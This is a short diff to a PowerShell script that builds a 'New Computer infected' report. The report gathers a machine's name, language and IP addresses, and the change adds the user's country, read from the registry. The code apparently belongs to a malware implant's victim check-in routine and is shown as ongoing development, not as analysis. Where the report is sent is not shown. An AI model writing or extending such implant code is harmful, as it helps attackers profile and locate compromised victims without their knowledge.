@@ -12,12 +12,14 @@ catch {
     $ipWlan = 'No Wlan' 
 } 
 $language = (Get-WinUserLanguageList)[0].autonym
+$country = Get-ItemProperty 'HKCU:\Control Panel\International\Geo\' | Select-Object -exp Name
 $description = 
 "
 New Computer infected 
 ---------------------------------
 Computer Name = $env:computername 
 Computer Language = $language
+Location (country) = $country
 Ethernet IP = $ipEthernet
 WLan IP = $ipWlan
 "
